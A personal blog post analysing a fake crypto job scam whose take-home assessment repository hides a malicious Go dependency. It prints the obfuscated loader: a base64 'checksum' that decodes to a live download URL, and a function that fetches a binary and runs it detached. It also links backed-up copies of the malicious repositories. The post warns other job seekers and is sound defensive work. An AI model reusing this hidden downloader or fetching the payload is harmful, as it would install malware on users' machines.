---
title: "Having Fun With a Scamming Crypto Job"
date: 2025-04-09T00:17:16+07:00
draft: false
toc: true
tags:
- crypto
- scam
- fake-job
categories:
---

I'm going to cover what happened and the technical details of a crypto job scam
that I've avoided. Let's hope that it can be both entertaining and informative.

It's my second time encoutering this kind of scam. In the first time, I just
ignored it as the sign is too obvious: a non-fitting job (frontend heavy job for
a backend guy) where the recruiter is "impressed with my technical skills" and
think that I'm "an exellent fit". For this second time, I got fooled at first as
it is too good, and after I realized it's too good to be true and likely a scam,
instead of stopping early, I just got... more patient and curious about what's
behind. 

## The Conversation

It started with a message from a seemingly real recruiter from a prestige
company. I overjumped with joy as it's been a long time since the last ocassion
I'm reached out by a recruiter.

![](../images/crypto-job-scam-1.png)

The recruiter asked about a specific work in my resume. I felt that it's weird,
but tried to answer it at the best of my ability.

![](../images/crypto-job-scam-2.png)

However, things started getting weirder when I wanted more specific information
about the role and the team, but got a generic response. "One-hour technical
assessment" is rare in this employer's market as well. I decided to dig the
recruiter's LinkedIn profile and found that he/she isn't connected to any
employee in the company. The company itself has a career portal that wasn't
showing any available role that is fully remote nor for Vietnamese candidates.

![](../images/crypto-job-scam-3.png)

By now, I realized that it's highly a scam, but got curious about what's next,
so I stayed.

![](../images/crypto-job-scam-4.png)

I guessed that it'll involve downloading and running code, and I was right.

![](../images/crypto-job-scam-5.png)

## Code Analysis

Just poking around the files shouldn't cause any problem, but if you're
paranoid, you can use a lightweight sandbox like `firejail` to limit filesytem
access and network access.

```shell
firejail --net=none --private bash
```

`unzip`ing the compressed file should give us a regular code repository
[^code-main]. The dependencies also look normal at the first glance:

```
module unirouter

go 1.24.1

toolchain go1.24.2

require (
        github.com/TedCollin/uniroute/v2 v2.1.3
        github.com/ethereum/go-ethereum v1.14.11
        github.com/joho/godotenv v1.5.1
)

...
```

I double checked the primary dependencies, and everything is normal except for
`github.com/TedCollin/uniroute/v2` [^code-downloader]:

![](../images/crypto-job-scam-6.png)

The code in `uniroute.go` did confirm that there is something fishy going on:

```go
package uniroute

import "encoding/base64"

var (
        checksum = "aHR0cHM6Ly9kb3dubG9hZC5kYXRhdGFibGV0ZW1wbGF0ZS54eXovYWNjb3VudC9yZWdpc3Rlci9pZD04MTE4NTU1OTAyMDYxODk5JnNlY3JldD1Rd0xvT1pTRGFrRmg="
)

func GetUniRoute() {
        chsum, _ := base64.StdEncoding.DecodeString(checksum)
        fset(string(chsum))
}
```

Decoding `checksum` gives us:

```
https://download.datatabletemplate.xyz/account/register/id=8118555902061899&secret=QwLoOZSDakFh
```

There are different implementations of `fset` for each platform (Linux, Windows,
and MacOS), but the gist of it is to download the link above as a binary file
and execute it.

```go
func fset(data_path string) {
	tmpDir := os.TempDir()
	targetPath := filepath.Join(tmpDir, "init")

	// Create the file to write
	file, err := os.Create(targetPath)
	...

	// Perform the GET request
	// Create HTTP request
	req, err := http.NewRequest("GET", data_path, nil)
    ...

	// Set OS-specific header
	req.Header.Set("User-Agent", "lnux")

	// Perform the GET request
	client := &http.Client{}
	resp, err := client.Do(req)
	...

	// Write response to file
	_, err = io.Copy(file, resp.Body)
	...

	cmd := exec.Command("nohup", "bash", targetPath, "&")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true,
	}

	cmd.Stderr = nil
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Start()
}
```

I tried downloading the binary file, but couldn't as there were errors with my
TLS (?).

```shell
curl -H 'User-Agent: lnux' 'https://download.datatabletemplate.xyz/account/register/id=8118555902061899&secret=QwLoOZSDakFh' -o binary
# curl: (35) TLS connect error: error:80000002:system library::No such file or directory
```

I decided not pushing it further. My guess is that the binary is a "wallet
drainer", a mallicious actor that read your sensitive data on the machine and
sent it to the scammer.

## Conclusion

By now, I hope you feel obvious that "if it's too good to be true, then it's
probably is (a scam)". But I can imagine why people fall for this: the
excitement of having a lucrative job offer blinds us from being rational.
Technical-wise, we should check the code we are going to run, including the
dependencies. Non-technical-wise, we should check:

- Nationality required: it's a red flag if the company is not hiring worldwide
  nor people from your country, and there is still a job
- Job's specific details: it's a red flag if the recruiter refuse to elaborate
  on the work and the technical stack and the team

Scamming is common in crypto world [^crypto-job-scams-article] and you can never
be too careful.

**Update**: following a suggestion on Tildes [^tildes-suggestion], I reported
the scam to:

- GitHub: asked them to look at the malware downloading repository
  [^code-downloader].
- Company R: told them that someone impersonated their recruiter.
- Namecheap, the registrar of the domain `datatabletemplate.xyz`: told them
  about what happened.
- Telegram, the platform that the conversation happened: told them about what
  happened.

[^code-main]: https://github.com/thanhnguyen2187/unirouter-compromised
[^code-downloader]: I [backed it
    up](https://github.com/thanhnguyen2187/uniroute-compromised) from the
    [original repository](https://github.com/TedCollin/uniroute/) (likely to be
    taken down after a while). 
[^crypto-job-scams-article]: https://cointelegraph.com/learn/articles/crypto-job-scams
[^tildes-suggestion]: https://tildes.net/~comp/1n9o/having_fun_with_a_scamming_crypto_job#comment-fbl8

